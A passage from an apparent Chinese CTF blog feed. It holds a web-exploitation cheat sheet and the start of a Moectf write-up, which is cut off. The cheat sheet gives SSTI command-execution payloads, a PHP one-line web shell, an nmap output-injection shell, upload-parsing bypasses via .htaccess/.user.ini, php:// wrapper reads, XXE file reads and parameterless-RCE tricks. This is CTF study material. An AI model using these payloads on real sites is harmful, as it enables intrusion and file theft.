%&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].eval(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&lt;command&gt;&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p>Flask</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;) 是可以读取配置的</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><span class="language-xml">应该是可以查看app.config的内容</span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;.config]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">Z2V0X2ZsYXNoZWRfbWVzc2FnZXM</span>=.X19nbG9iYWxzX18=[‘current_app’.config]&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="常用后缀"><a href="#常用后缀" class="headerlink" title="常用后缀"></a>常用后缀</h3><p>.phtml</p><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SHELL&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="nmap执行"><a href="#nmap执行" class="headerlink" title="nmap执行"></a>nmap执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?host=’ <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>(“shell”);?)&gt; -oG shell.php ’<br></code></pre></td></tr></table></figure><h3 id="解析绕过"><a href="#解析绕过" class="headerlink" title="解析绕过"></a>解析绕过</h3><p>先利用报错来查看中间件为什么</p><p>nginx -&gt; user.ini</p><p>apache -&gt; .htaccess</p><p>user.ini</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><br><span class="hljs-attribute">auto_append_file</span>=shell.jpg<br></code></pre></td></tr></table></figure><p>.htaccess</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;shell.jpg&quot;</span>&gt;</span><br><span class="hljs-attribute">Sethandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>or</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">FilesMatch</span> &quot;<span class="hljs-attr">shell.jpg</span>&quot;&gt;</span><br>Sethandler application/x-httpd-php<br><span class="hljs-comment">&lt;!-- 将匹配到的 muma.jpg 文件按照php解析执行 --&gt;</span><br><br>Addhandler php5-script .jpg<br><span class="hljs-comment">&lt;!-- 将匹配到的 muma.jpg 文件按照php解析执行 --&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">FilesMatch</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>index.php.bat</p><p>user.php.bak</p><p>phpmyadmin</p><p>robots.txt</p><p>.git源码泄露，用GitHack下载源码</p><p>&#x2F;<a href="http://www.tar.gz/">www.tar.gz</a></p><p><a href="http://www.zip/">www.zip</a></p><h2 id="网页请求头"><a href="#网页请求头" class="headerlink" title="网页请求头"></a>网页请求头</h2><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p>Referer:<a href="https://www.baidu.com/?start=1%E5%BD%93%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%91web%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E4%B8%80%E8%88%AC%E4%BC%9A%E5%B8%A6%E4%B8%8AReferer%EF%BC%8C%E5%91%8A%E8%AF%89%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%88%91%E6%98%AF%E4%BB%8E%E5%93%AA%E4%B8%AA%E9%A1%B5%E9%9D%A2%E9%93%BE%E6%8E%A5%E8%BF%87%E6%9D%A5%E7%9A%84%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B1%8D%E6%AD%A4%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97%E4%B8%80%E4%BA%9B%E4%BF%A1%E6%81%AF%E7%94%A8%E4%BA%8E%E5%A4%84%E7%90%86%E3%80%82">https://www.baidu.com/?start=1当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。</a></p><h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h3><p>User-Agent:Mozilla&#x2F;…，告诉HTTP服务器， 客户端使用的操作系统和浏览器的名称和版本。</p><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>Cookie是用来存储一些用户信息以便让服务器辨别用户身份的（大多数需要登录的网站上面会比较常见），比如cookie会存储一些用户的用户名和密码，当用户登录后就会在客户端产生一个cookie来存储相关信息，这样浏览器通过读取cookie的信息去服务器上验证并通过后会判定你是合法用户，从而允许查看相应网页。当然cookie里面的数据不仅仅是上述范围，还有很多信息可以存储是cookie里面，比如sessionid等。</p><h3 id="X-Forwarded-For-Client-Ip-x-real-ip"><a href="#X-Forwarded-For-Client-Ip-x-real-ip" class="headerlink" title="X-Forwarded-For (Client-Ip,x-real-ip)"></a>X-Forwarded-For (Client-Ip,x-real-ip)</h3><p> X-Forwarded-For 请求头用于标识客户端的原始IP地址，特别是在通过代理服务器或负载均衡器等中间设备进行通信时。当请求从客户端传递到代理服务器时，代理服务器会将客户端的IP地址添加到X-Forwarded-For头中，以便目标服务器知道请求的来源。</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>伪协议读取<br>secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p><p>伪协议写入<br>text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,xxx(为相对应的base64编码)</p><p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><a href="https://www.cnblogs.com/xinxin999/p/12521014.html">https://www.cnblogs.com/xinxin999/p/12521014.html</a></p><h2 id="xml注入"><a href="#xml注入" class="headerlink" title="xml注入"></a>xml注入</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">feng</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xml</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xml</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/6887#toc-2">从XML相关一步一步到XXE漏洞</a></p><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参数RCE，其实就是通过<strong>没有参数的函数</strong>达到命令执行的目的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])&#123;<br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果’;’&#x3D;&#x3D;&#x3D;preg_replace(…)，那么就执行exp传递的命令<br>\ : 转义字符<br>[a-z,<em>]+ : [a-z,</em>]匹配小写字母和下划线 +表示1到多个<br>(?R)? : (?R)代表当前表达式，就是这个(&#x2F;[a-z,_]+((?R)?)&#x2F;)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）<br>简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();</p><h3 id="常见绕过姿势"><a href="#常见绕过姿势" class="headerlink" title="常见绕过姿势"></a>常见绕过姿势</h3><h4 id="1、getallheaders"><a href="#1、getallheaders" class="headerlink" title="1、getallheaders()"></a>1、getallheaders()</h4><p><code>getallheaders()</code>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好<code>implode()</code>这个函数就能胜任。</p><p><code>implode()</code>能够直接将<code>getallheaders()</code>返回的数组转化为字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405132202676.png" alt="在这里插入图片描述"></p><p>可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405132202676.png"></p><p>payload：<code>?exp=eval(implode(getallheaders()));</code></p><h4 id="2、get-defined-vars"><a href="#2、get-defined-vars" class="headerlink" title="2、get_defined_vars()"></a>2、get_defined_vars()</h4><h5 id="查看当前目录文件名"><a href="#查看当前目录文件名" class="headerlink" title="查看当前目录文件名"></a>查看当前目录文件名</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())));</span><br></code></pre></td></tr></table></figure><h5 id="读取当前目录文件"><a href="#读取当前目录文件" class="headerlink" title="读取当前目录文件"></a>读取当前目录文件</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs isbl">当前目录倒数第一位文件：<br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">end</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>())));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">current</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"></span><br><span class="hljs-function">当前目录倒数第二位文件：</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"></span><br><span class="hljs-function">随机返回当前目录文件：</span><br><span class="hljs-function"><span class="hljs-title">highlight_file</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))));</span><br></code></pre></td></tr></table></figure><h5 id="查看上一级目录文件名"><a href="#查看上一级目录文件名" class="headerlink" title="查看上一级目录文件名"></a>查看上一级目录文件名</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())));</span><br><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br></code></pre></td></tr></table></figure><h5 id="读取上级目录文件"><a href="#读取上级目录文件" class="headerlink" title="读取上级目录文件"></a>读取上级目录文件</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">chdir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())))))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">hebrevc</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">chdir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>())))))))))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">hebrevc</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">chdir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">hebrevc</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">phpversion</span>())))))))))))))));</span><br></code></pre></td></tr></table></figure><p>payload解释：<br>● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。<br>● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。<br>● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名<br>● dirname(chdir(dirname()))配合切换文件路径</p><h5 id="查看和读取根目录文件"><a href="#查看和读取根目录文件" class="headerlink" title="查看和读取根目录文件"></a>查看和读取根目录文件</h5><p>所获得的字符串第一位有几率是&#x2F;，需要多试几次</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">strrev</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">array</span>())))))));</span><br></code></pre></td></tr></table></figure><h4 id="2、session-start"><a href="#2、session-start" class="headerlink" title="2、session_start()"></a>2、session_start()</h4><p>适用于：php7以下的版本<br>● **session_start()**：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()<br>● **session_id()**：获取&#x2F;设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</p><h5 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h5><p>● show_source(session_id(session_start()));<br>● var_dump(file_get_contents(session_id(session_start())))<br>● highlight_file(session_id(session_start()));<br>● readfile(session_id(session_start()));<br>抓包传入Cookie: PHPSESSID&#x3D;(想读的文件)即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/1.php?code=show_source(session_id(session_start()));</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=/flag<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/9360?time__1311=n4+xuDgD9DyiGQYDQNDsR32xfrorQDB00DiqhD&alichlgref=https://www.google.com.hk/">https://xz.aliyun.com/t/9360?time__1311=n4%2BxuDgD9DyiGQYDQNDsR32xfrorQDB00DiqhD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p><h2 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头"></a>常见文件头</h2><p>JPEG (jpg)，文件头：FFD8FFE1<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word&#x2F;Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Postscript (eps.or.ps)，文件头：252150532D41646F6265<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864</p><h2 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h2><ol><li>Unicode，UTF-8，URL编码：<a href="http://tool.chinaz.com/tools/urlencode.aspx">站长工具</a></li><li>Base系列：<a href="https://www.qqxiuzi.cn/bianma/base64.htm">千千秀字</a></li><li>摩尔斯编码：<a href="https://www.halove.net/ming/morse.php">世纪算命网</a></li><li>条形码&#x2F;二维码：<a href="https://online-barcode-reader.inliteresearch.com/">online-barcode-reader</a></li><li>MD5，Escape&#x2F;Unescape：<a href="https://tool.chinaz.com/tools/escape.aspx">站长工具</a></li><li>UUencode编码：<a href="http://ctf.ssleye.com/uu.html">在线工具</a></li><li>XXencode编码：<a href="http://ctf.ssleye.com/xxencode.html">在线工具</a></li><li>恺撒密码：<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">千千秀字</a></li><li>栅栏密码：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">千千秀字（包含空格）</a>，<a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/">Rail-fence Cipher（自动去空格）</a></li><li>Brainfuck&#x2F;Ook！：<a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook！</a>（这好像是外网，可能会慢些）</li><li>JSFuck：<a href="http://utf-8.jp/public/jsfuck.html">JSF*ck demo</a></li><li>ASCII转换：<a href="http://www.ab126.com/goju/1711.html">ASCII在线转换器-十六进制，十进制、 二进制</a></li><li>Base91：<a href="https://www.dcode.fr/base-91-encoding">Base91 Cipher</a></li><li>cyberchef: <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)">cyberchef</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>常用知识点</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Moectf</title>
    <link href="/2023/09/17/%E6%AF%94%E8%B5%9B/Moectf/"/>
    <url>/2023/09/17/%E6%AF%94%E8%B5%9B/Moectf/</url>
    
    <content type="html"><![CDATA[<h2 id="Moectf"><a href="#Moectf" class="headerlink" title="Moectf"></a>Moectf</h2><h3 id="Web-http"><a href="#Web-http" class="headerlink" title="Web-http"></a>Web-http</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">this <span class="hljs-keyword">is</span> GET <span class="hljs-keyword">method</span>,<br><span class="hljs-title function_">your</span> <span class="hljs-title function_">mission</span>:<br><br><span class="hljs-number">1</span>.use parameter: UwU=u<br><span class="hljs-number">2</span>.post **form**: Luv=u<br><span class="hljs-number">3</span>.use admin character<br><span class="hljs-number">4</span>.request <span class="hljs-keyword">from</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-number">5</span>.use browser <span class="hljs-string">&#x27;MoeBrowser&#x27;</span><br>Complete All Missions<br></code></pre></td></tr></table></figure><p>1.get方式传参： UwU&#x3D;u<br>2.post方式传参： Luv&#x3D;u<br>3.bp抓包改cookie为： admin<br>4.加入X-forwarded-for: 127.0.0.1<br>5.修改UA头为： MoeBrowser</p><p>Brilliant! Now I give you my flag: moectf{basic_http_knowledge_S0y4sE6ZlBM9RDemgwzNI0BOR4E4CJ7U}</p><h3 id="Web-Web入门指北"><a href="#Web-Web入门指北" class="headerlink" title="Web-Web入门指北"></a>Web-Web入门指北</h3><p>题目为：</p><p>666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c513152475831637959<br>6c396a61474673624756755a3055684958303d</p><p>通过hex解码为：</p><p>flag&#x3D;bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0&#x3D;</p><p>Base64解码得到flag</p><p>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</p><h3 id="Web-彼岸的flag"><a href="#Web-彼岸的flag" class="headerlink" title="Web-彼岸的flag"></a>Web-彼岸的flag</h3><p>在源代码中找到flag</p><h3 id="Web-cookie"><a href="#Web-cookie" class="headerlink" title="Web-cookie"></a>Web-cookie</h3><p>压缩包内容如下</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">## 一些api说明<br><br>注册 `POST /register`<br>json<br>&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;koito&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>&#125;<br><br><br>登录 `POST /login`<br>json<br>&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;koito&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>&#125;<br><br><br>获取flag `GET /flag`<br><br>查询服务状态 `GET /status`<br></code></pre></td></tr></table></figure><p>进入&#x2F;register </p><p>hint说了readme只是一个样例，不是拿来复制的</p><p>修改参数POST提交</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>注册成功</p><p>然后进入&#x2F;login</p><p>POST提交</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 